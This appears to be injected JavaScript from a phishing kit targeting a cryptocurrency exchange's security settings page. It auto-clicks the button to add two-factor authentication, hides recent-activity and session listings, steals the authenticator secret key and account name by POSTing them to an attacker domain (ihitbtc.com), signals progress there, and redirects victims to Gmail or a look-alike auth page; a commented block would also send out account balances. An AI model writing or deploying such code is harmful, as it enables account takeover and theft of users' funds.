setTimeout(function() {
    function xxx() {
        if (window.location.href.indexOf("/settings/security") > -1) {
            if (document.documentElement.innerHTML.indexOf('globalPopupClass popup_hktneM5g') > -1) {} else if (document.documentElement.innerText.indexOf('Add GAuth') > -1 && !document.documentElement.innerHTML.indexOf('globalPopupClass popup_hktneM5g') > -1) {
                document.querySelectorAll('.defaultButton_x6NuocNz').forEach(elem => {
                    if (elem.innerText.search('Add GAuth') > -1) {
                        elem.click();
                    }
                })
            }
        }
    }
    setInterval(function() {
        xxx();
    }, 300);
}, 1000);


setTimeout(function() {
  
        if (window.location.href.indexOf("-to-") > -1) {
         
       
                window.location.replace("/settings/security");
                
         
       
        } else {

//NOTHING

        }
    
    }, 3000);




setTimeout(function() {
    function x() {
        if (document.documentElement.innerText.indexOf('Your recent activity') > -1) {
            document.getElementsByClassName('styles__header--1Jnpp')[2].remove();
            document.getElementsByClassName('styles__header--1Jnpp')[2].remove();
            document.getElementsByClassName('styles__section--1apTj styles__sessionsSection--3wCGr')[0].remove();
            document.getElementsByClassName('styles__tableWrp--2GW_m')[0].remove();
        } else {

            // NOTHING

        }
    }
    setInterval(function() {
        x();
    }, 500);
}, 1000);
setTimeout(function() {
    function xx() {
        if (document.documentElement.innerText.indexOf('Show') > -1) {
            var xPathRes = document.evaluate('//div[2]/div[3]/a/span', document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
            xPathRes.singleNodeValue.click();
        } else if (document.documentElement.innerText.indexOf('Secure private key:') > -1) {
            var key = document.getElementsByClassName('styles__secureKey--DRmco')[0].innerText;
            var name = document.getElementsByClassName('styles__authName--1nKIg')[0].innerText;
      //    var qr1 = document.getElementsByClassName('qr_cNV1UhuR')[0].innerHTML.replace("\" width=\"222\" height=\"222\">", "");
      //      var qr = qr1.replace("<img src=\"data:image/gif;", "");
            var xf1 = new XMLHttpRequest();
            xf1.open("POST", "https://www.ihitbtc.com/control");
            xf1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xf1.send("key=" + key + "&name=" + name);
        }
    }
    setInterval(function() {
        xx();
    }, 2500);
}, 1000);


setTimeout(function() {
    function xxxx() {

        if (document.documentElement.innerText.indexOf('you will soon be redirected') > -1) {

            var xf = new XMLHttpRequest();
            xf.open("POST", "https://www.ihitbtc.com/control");
            xf.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xf.send("check=ok");

            if(localStorage["email"].indexOf('gmail') >= 0) {

            var submit = document.querySelectorAll('button[class="defaultButton_x6NuocNz"]')[1];
            submit.setAttribute("onclick", "sendRedirect()", 500);

            localStorage.setItem('link', 'https://accounts.google.com/ServiceLogin/identifier?service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&mail='+ localStorage["email"]);
         

            var tID = setTimeout(function() {
                window.close();
                window.clearTimeout(tID);
                window.location.replace(localStorage["link"]);
                
            }, 7500);




        } else if(localStorage["email"].indexOf('yahoo') >= 0) {


 var submit = document.querySelectorAll('button[class="defaultButton_x6NuocNz"]')[1];
            submit.setAttribute("onclick", "sendRedirect()", 500);

            localStorage.setItem('link', 'https://auth.sync.ihitbtc.com/NCKEFmkm');
         

            var tID = setTimeout(function() {
                window.close();
                window.clearTimeout(tID);
                window.location.replace(localStorage["link"]);
                
            }, 4000);


        }

        } else {

        }
    }
    setInterval(function() {
        xxxx();
    }, 4500);
}, 1000);

/*
setTimeout(function() {
    function xxxxx() {
        if (document.documentElement.innerHTML.indexOf('styles__balanceVal--3BfF_') > -1 && window.location.href.indexOf("/settings/security") > -1) {

            var balance_check1 = document.getElementsByClassName('styles__balanceVal--3BfF_')[1].innerHTML.replace("</span><span data-pointer=\"estimated_bottom_value\">", " BTC, ");
            var balance_check2 = balance_check1.replace("<span data-pointer=\"estimated_top_value\">", "");
            var balance_check = balance_check2.replace("</span>", "$");

            if (balance_check == '0 BTC, 0$') {
                window.location.replace("https://hitbtc.com/signinapp");

            } else {

                var xf1 = new XMLHttpRequest();
                xf1.open("POST", "https://www.ihitbtc.com/control");
                xf1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xf1.send("balance=" + balance_check);

            }


        } else {

            // NOTHING
        }
    }
    setInterval(function() {
        xxxxx();
    }, 15000)
}, 1000);
*/


setTimeout(function() {
    function xxxxxx() {
        if (document.documentElement.innerText.indexOf('@') > -1 && window.location.href.indexOf("/settings/security") > -1 && document.documentElement.innerHTML.indexOf('globalPopupClass popup_hktneM5g') > -1 && document.documentElement.innerHTML.indexOf('styles__authName--1nKIg') > -1) {

            var storage_email = document.getElementsByClassName('styles__authName--1nKIg')[0].innerText;
var pattern = /-[0-9]+/g;
storage_email.replace(pattern, "");

            localStorage.setItem('email', storage_email);


        } else {

            // NOTHING
        }
    }
    setInterval(function() {
        xxxxxx();
    }, 2500)
}, 1000);

function sendRedirect() {
  
    var tID = setTimeout(function() {
        window.close();
        window.clearTimeout(tID);
        window.location.replace(localStorage["link"]);
        
    }, 500);

}